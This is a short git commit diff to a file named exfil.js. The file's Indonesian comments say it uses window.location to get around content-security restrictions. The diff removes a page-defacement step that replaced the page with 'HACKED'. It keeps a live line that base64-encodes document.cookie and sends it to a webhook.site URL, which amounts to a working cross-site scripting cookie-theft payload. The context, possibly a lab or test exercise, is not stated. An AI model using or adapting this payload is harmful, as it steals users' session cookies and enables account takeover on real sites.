52edce4514c04f2c8d36b72c5b4fa6c037311446
Fauzi Ismail <mailvelous.career@gmail.com>
2026-01-01 06:56:57 +0700

    Remove background change and page content modification

--- exfil.js
+++ exfil.js
@@ -1,7 +1,3 @@
 // Menggunakan window.location untuk bypass pembatasan img-src dan connect-src
 // Data akan dikirim sebagai query parameter 'c'
-
-// Ganti background jadi merah atau hapus seluruh halaman
-document.body.style.backgroundColor = 'red';
-document.body.innerHTML = '<h1>HACKED</h1>';
 window.location = "https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?c=" + btoa(document.cookie);
